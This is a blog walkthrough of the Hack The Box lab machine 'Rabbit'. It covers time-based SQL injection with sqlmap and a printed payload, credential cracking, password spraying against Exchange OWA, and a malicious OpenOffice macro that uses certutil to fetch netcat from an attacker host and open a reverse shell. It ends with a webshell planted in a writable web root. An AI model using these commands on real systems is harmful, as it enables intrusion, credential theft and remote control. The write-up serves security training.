---
title: "Rabbit Walkthrough - HTB Insane | Time-Based SQLi & OpenOffice Macro Exploitation"
description: "Complete walkthrough of Rabbit from Hack The Box. An insane Windows machine featuring time-based SQL injection in complain management system requiring extensive sqlmap enumeration to extract credentials from secret database. Microsoft Exchange OWA access enables phishing attack with malicious OpenOffice ODT macro using living off the land techniques (certutil/bitsadmin) to bypass Windows Defender and PowerShell constrained mode. Privilege escalation exploits writable C:\\wamp64\\www directory with BUILTIN\\Users permissions for webshell upload. Box stability issues with frequent crashes required 30+ resets during completion."
author: dua2z3rr
date: 2026-05-02 1:00:00
categories:
  - HackTheBox
  - Machines
tags: ["web-application", "enterprise-network", "vulnerability-assessment", "person", "injections", "active-directory", "security-tools", "authentication", "social-engineering", "sql-injection", "information-disclosure", "weak-permissions", "vbscript", "openoffice", "macros", "web-site-structure-discovery", "password-reuse", "password-cracking", "antivirus-bypass", "phishing"]
image: /assets/img/rabbit/rabbit-resized.png
---

## Overview

Rabbit is a fairly realistic machine which provides excellent practice for client-side attacks and web app enumeration. The large potential attack surface of the machine and lack of feedback for created payloads increases the difficulty of the machine.

---

## External Enumeration

### Nmap

```shell
[Apr 17, 2026 - 10:28:41 (CEST)] exegol-main rabbit # ports=$(nmap -p- --min-rate=1000 -T4 rabbit.htb 2>/dev/null | grep '^[0-9]' | cut -d '/' -f1 | paste -sd ',' -); nmap -vv -p"$ports" -sC -sV rabbit.htb -oX rabbit.xml  
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-17 10:31 CEST  
<SNIP>
Nmap scan report for rabbit.htb (10.129.20.119)  
Host is up, received reset ttl 127 (0.18s latency).  
Scanned at 2026-04-17 10:31:36 CEST for 251s  
  
PORT      STATE SERVICE              REASON          VERSION  
25/tcp    open  smtp                 syn-ack ttl 127 Microsoft Exchange smtpd  
53/tcp    open  domain               syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)  
80/tcp    open  http                 syn-ack ttl 127 Microsoft IIS httpd 7.5  
|_http-title: 403 - Forbidden: Access is denied.  
88/tcp    open  tcpwrapped           syn-ack ttl 127  
135/tcp   open  msrpc                syn-ack ttl 127 Microsoft Windows RPC  
389/tcp   open  ldap                 syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)  
443/tcp   open  ssl/https?           syn-ack ttl 127  
445/tcp   open  microsoft-ds?        syn-ack ttl 127  
464/tcp   open  kpasswd5?            syn-ack ttl 127  
587/tcp   open  smtp                 syn-ack ttl 127 Microsoft Exchange smtpd  
3306/tcp  open  mysql                syn-ack ttl 127 MySQL 5.7.19  
5985/tcp  open  http                 syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
8080/tcp  open  http                 syn-ack ttl 127 Apache httpd 2.4.27 ((Win64) PHP/5.6.31)  
|_http-title: Example  
|_http-server-header: Apache/2.4.27 (Win64) PHP/5.6.31  
[... 38 more RPC ports ...]
Service Info: Hosts: Rabbit.htb.local, RABBIT; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1  
<SNIP>
```

**Key findings:**
- **51 open ports** - extensive Windows Server environment
- Port 25/587: **Microsoft Exchange** SMTP
- Port 80: **IIS 7.5** (403 Forbidden)
- Port 443: **HTTPS** (Exchange OWA likely)
- Port 88: **Kerberos** (Active Directory)
- Port 389: **LDAP** (Domain: htb.local)
- Port 3306: **MySQL 5.7.19**
- Port 8080: **Apache 2.4.27** with PHP 5.6.31
- Windows Server 2008 R2 SP1

---

## Initial Access

### HTTP Fuzzing Port 8080

Fuzzing on port 80 led nowhere, but port 8080 reveals interesting directories:

```shell
[Apr 17, 2026 - 10:40:56 (CEST)] exegol-main /workspace # ffuf -w /opt/lists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u http://rabbit.htb:8080/FUZZ -ic -fw 73  
<SNIP>
joomla                  [Status: 301, Size: 326, Words: 21, Lines: 10, Duration: 211ms]  
complain                [Status: 301, Size: 328, Words: 21, Lines: 10, Duration: 207ms]  
<SNIP>
```

**Directories found:**
- **/joomla** - CMS (covered in other boxes)
- **/complain** - Complaint management system

### Complain Management System

Visiting `/complain` shows a login page:

![complain login page](assets/img/rabbit/complain.png)

Online vulnerabilities for this login page exist, but they don't work. Let's create a customer account.

### Access Control Bypass

After creating a customer account and logging in, the assignment page URL is structured:

`http://rabbit.htb:8080/complain/view.php?mod=customer&view=compDetails`

**Changing the mod parameter from `customer` to `admin` reveals all complaints:**

![complains](assets/img/rabbit/complains.png)

### SQL Injection Discovery

Clicking on detail then assign sends a POST request:

```http
POST /complain/process.php?action=assignComplain HTTP/1.1
Host: rabbit.htb:8080
Content-Length: 105
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=k4r113en7ehusemm4pcvjg1a94

compId=11&compDesc=Facing+problem+in+installation+of+WLAN.+Pls+assist.&engId=6&btnLogin=+Assing+Complain+
```

**The `compId` parameter is vulnerable to time-based SQL injection.**

### SQL Injection Exploitation

> This was the most laborious part of the box. The box crashed at least 10 times, requiring restarts each time. Using the domain name instead of IP helps sqlmap resume from where it left off. The entire process took many hours - I recommend jumping directly to the results below.
{: .prompt-danger }

Initial injection confirmation:

```shell
[Apr 24, 2026 - 14:07:16 (CEST)] exegol-main rabbit # sqlmap -r req2 --batch --level 5 --risk 3 --batch --dbms MYSQL --dump -p compId  --technique=T --time-sec=10  
<SNIP>
[14:08:50] [INFO] POST parameter 'compId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable  
<SNIP>
Parameter: compId (POST)  
Type: time-based blind  
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  
Payload: compId=11 AND (SELECT 4973 FROM (SELECT(SLEEP(10)))ULdt)&compDesc=Facing problem in installation of WLAN. Pls assist.&engId=6&btnLogin= Assing Complain  
<SNIP>
```

**Database enumeration:**

```shell
[Apr 25, 2026 - 13:11:51 (CEST)] exegol-main rabbit # sqlmap -r req4 --batch --level 5 --risk 3 --batch --dbms MySQL -p compId  --technique=T --time-sec=10 --dbs
<SNIP>
available databases [7]:
[*] complain
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] secret
[*] sys
```

**The `secret` database looks very interesting.**

**Enumerating secret database:**

```shell
[Apr 25, 2026 - 15:29:05 (CEST)] exegol-main rabbit # sqlmap -r req5 --batch --level 5 --risk 3 --batch --dbms MySQL -p compId  --technique=T --time-sec=10 -D secret --tables
<SNIP>
Database: secret
[1 table]
+-------+
| users |
+-------+
```

> The users table has 2 columns: username and password. I had to enumerate them separately, and when using these credentials, I performed password spraying with the successfully cracked passwords.
{: .prompt-danger }

**Extracting passwords:**

```shell
[Apr 26, 2026 - 19:46:18 (CEST)] exegol-main rabbit # sqlmap -r req11 --batch --level 5 --risk 3 --batch --dbms MySQL -p compId  --technique=T --time-sec=10 -D secret -T users --dump -C Password
<SNIP>
[20:02:42] [INFO] recognized possible password hashes in column 'Password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[20:02:45] [INFO] cracked password 'barcelona' for hash 'dea56e47f1c62c30b83b70eb281a6c39'
[20:02:49] [INFO] cracked password 'popcorn' for hash '33da7a40473c1637f1a2e142f4925194'
[20:02:50] [INFO] cracked password 'santiago' for hash 'a6f30815a43f38ec6de95b9a9d74da37'
[20:02:50] [INFO] cracked password 'pussycatdolls' for hash 'b9c2538d92362e0e18e52d0ee9ca0c6f'
Database: secret
Table: users
[10 entries]
+--------------------------------------------------+
| Password                                         |
+--------------------------------------------------+
| 13fa8abd10eed98d89fd6fc678afaf94                 |
| 33903fbcc0b1046a09edfaa0a65e8f8c                 |
| 33da7a40473c1637f1a2e142f4925194 (popcorn)       |
| 370fc3559c9f0bff80543f2e1151c537                 |
| 719da165a626b4cf23b626896c213b84                 |
| a6f30815a43f38ec6de95b9a9d74da37 (santiago)      |
| b9c2538d92362e0e18e52d0ee9ca0c6f (pussycatdolls) |
| d322dc36451587ea2994c84c9d9717a1                 |
| d459f76a5eeeed0eca8ab4476c144ac4                 |
| dea56e47f1c62c30b83b70eb281a6c39 (barcelona)     |
+--------------------------------------------------+
```

**Extracting usernames:**

```shell
[Apr 26, 2026 - 21:57:06 (CEST)] exegol-main rabbit # sqlmap -r req12 --batch --level 5 --risk 3 --batch --dbms MySQL -p compId  --technique=T --time-sec=10 -D secret -T users --dump -C Username
<SNIP>
Database: secret
Table: users
[10 entries]
+----------+
| Username |
+----------+
| Ariel    |
| Dimitri  |
| Dumah    |
| Kain     |
| Magnus   |
| Malek    |
| Moebius  |
| Raziel   |
| Turel    |
| Zephon   |
+----------+
```

**Cracked credentials:**
- barcelona
- popcorn
- santiago
- pussycatdolls

---

## Microsoft Exchange Access

### OWA Login

These credentials can be used for Microsoft Exchange. During earlier enumeration, I found the `/owa` directory on port 443.

**Firefox TLS version fix required:**

```
Secure Connection Failed

Error code: SSL_ERROR_UNSUPPORTED_VERSION

This website might not support the TLS 1.2 protocol, which is the minimum version supported by Firefox.
```

**Fix:** Navigate to `about:config`, then set `security.tls.version.min` to 1.

![owa login page](assets/img/rabbit/owa_login.png)

**Working credentials (after password spraying):**
- `Ariel:pussycatdolls`
- `Kain:doradaybendita`
- `Magnus:xNnWo6272k7x`

### Email Enumeration

In Kain@htb.local's mailbox, we find these emails:

```
Please send your weekly TPS reports to management ASAP!

Administrator
```

```
The security team has deployed windows defender and PowerShell constrain mode as the default organization security standard.

Security
```

**This will be useful for privilege escalation - keep it in mind.**

```
There has been a change in the allowed software. Help Desk has moved forward with deploying Open Office to everyone.

IT
```

> Every inbox is identical - there are no hidden emails in specific mailboxes.

**We need to create something with OpenOffice.** We could create a malicious report with macros, similar to what I did in the [Job](https://dua2z3rr.github.io/posts/Job-Walkthrough/) box.

---

## Malicious ODT File

### Initial Attempt with Metasploit

Creating an ODT file with malicious macro in msfconsole:

```shell
[Apr 26, 2026 - 23:01:19 (CEST)] exegol-main rabbit # msfconsole
<SNIP>
msf > search open office
<SNIP>
0   exploit/multi/misc/openoffice_document_macro                                                        2017-02-08       excellent  No     Apache OpenOffice Text Document Malicious Macro Execution
<SNIP>
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(multi/misc/openoffice_document_macro) > set lhost tun0
lhost => 10.10.15.76
msf exploit(multi/misc/openoffice_document_macro) > set lport 9001
lport => 9001
msf exploit(multi/misc/openoffice_document_macro) > run
<SNIP>
[+] msf.odt stored at /root/.msf4/local/msf.odt
```

> I recommend using the light version of Exchange when sending the email. The server is slow, and it takes significantly less time to insert attachments.
{: .prompt-tip }

**However, this doesn't work.** The earlier email about security updates gives us a clue: `windows defender and PowerShell constrain mode as the default organization security standard`.

### Living Off The Land Approach

This tells us we need to use living off the land techniques. We can use tools like **certutil** or **bitsadmin**.

I open the generated document with LibreOffice and modify the macro:

![macro](assets/img/rabbit/macro.png)

**Modified macro using certutil to download nc64.exe:**
```vb
certutil.exe -urlcache -split -f http://10.10.15.76:8000/nc64.exe C:\Users\Public\nc64.exe
C:\Users\Public\nc64.exe 10.10.15.76 443 -e cmd.exe
```

Now we send an email with the ODT file attached, and we'll get a shell (after opening an HTTP server hosting nc64.exe):

```powershell
[May 01, 2026 - 16:30:03 (CEST)] exegol-main rabbit # nc -lnvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.27.53.
Ncat: Connection from 10.129.27.53:50430.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files\LibreOffice\program> cd C:\Users

C:\Users>dir
dir
Volume in drive C has no label.
Volume Serial Number is AEA8-5415

Directory of C:\Users

10/29/2017  10:05 AM    <DIR>          .
10/29/2017  10:05 AM    <DIR>          ..
11/13/2017  09:22 PM    <DIR>          Administrator
10/24/2017  01:38 PM    <DIR>          Classic .NET AppPool
07/14/2009  12:57 AM    <DIR>          Public
10/29/2017  11:12 PM    <DIR>          Raziel
               0 File(s)              0 bytes
               6 Dir(s)  24,440,373,248 bytes free

C:\Users>cd Raziel\Desktop
```

**Shell obtained as Raziel user.**

**User flag obtained.**

---

## Privilege Escalation

### Internal Enumeration

Enumeration was difficult overall, considering the box kept crashing and we had to wait again for a reverse shell, which can take some time...

Enumerating the root directory, we find an unusual folder:

```powershell
C:\>dir
dir
Volume in drive C has no label.
Volume Serial Number is AEA8-5415

Directory of C:\

10/24/2017  01:37 PM    <DIR>          inetpub
07/13/2009  11:20 PM    <DIR>          PerfLogs
03/21/2025  01:04 AM    <DIR>          Program Files
11/14/2017  04:40 PM    <DIR>          Program Files (x86)
05/02/2026  08:36 AM    <DIR>          temp
10/29/2017  10:05 AM    <DIR>          Users
10/28/2017  11:13 AM    <DIR>          wamp64
03/21/2025  01:04 AM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  24,441,643,008 bytes free

C:\>cd wamp64

C:\wamp64>dir
<SNIP>
10/28/2017  01:09 PM    <DIR>          www
<SNIP>

C:\wamp64>icacls www
icacls www
www NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(F)
    BUILTIN\Users:(I)(OI)(CI)(RX)
    BUILTIN\Users:(I)(CI)(AD)
    BUILTIN\Users:(I)(CI)(WD)
    CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

**Key finding:** `BUILTIN\Users` has the **AD (Append Data)** privilege, which allows file writing along with many other privileges. With this, we can obtain root access.

### Webshell Upload

Transferring a webshell to the target:

```powershell
C:\wamp64>cd www

C:\wamp64\www>powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\wamp64\www> wget http://10.10.15.76:8000/shell.php -OutFile shell.php

PS C:\wamp64\www> ls

Directory: C:\wamp64\www

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/28/2017  11:16 AM                complain
d-----       10/28/2017   1:13 PM                joomla
d-----       10/28/2017  11:13 AM                wamplangues
d-----       10/28/2017  11:14 AM                wampthemes
-a----        11/5/2016   3:44 PM          19478 add_vhost.php
-a----       12/31/2010   8:40 AM         202575 favicon.ico
-a----       11/15/2017  10:54 PM          10065 index.html
-a----        8/31/2017   6:26 PM          31543 index.old.php
-a----         5/2/2026   8:44 AM          20321 shell.php
-a----       12/13/2016   1:50 PM            763 testmysql.php
-a----        9/21/2015   6:30 PM            742 test_sockets.php
```

Now navigate to `http://rabbit.htb:8080/shell.php`:

![p0wny](assets/img/rabbit/p0wny.png)

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

The privilege escalation was significantly easier than getting the initial foothold. The extreme box stability issues were the most frustrating aspect: crashes occurred approximately every 45 minutes to 1 hour, requiring 30+ resets throughout completion. This made what should have been a challenging but educational experience into a frustrating endurance test. While blind SQL injection is a legitimate technique, the implementation here felt more like grinding than skill development. The living off the land requirement with certutil/bitsadmin was interesting and realistic, forcing avoidance of traditional payloads.

### Main Mistake

Getting stuck on the OpenOffice macro phase severely impacted my motivation to continue. I should have recognized earlier that the initial Metasploit approach wouldn't work and pivoted to living off the land techniques more quickly. The enormous time investment in the SQL injection phase was unavoidable given the box design, but I lost momentum during this tedious enumeration process.

### Alternative Approaches

For the OpenOffice macro, other living off the land binaries (LOLBins) like bitsadmin could achieve the same result, though certutil proved effective once I recognized the security constraints.

### Open Question

Is it acceptable for an Insane-rated box to have such severe stability issues? Box difficulty should come from technical challenges, not infrastructure problems requiring 30+ resets. Does a box maintain educational value when the primary challenge is enduring crashes rather than solving technical puzzles?

---

**Completed this box? How did you handle the stability issues and the SQL injection phase?** Leave a comment down below!
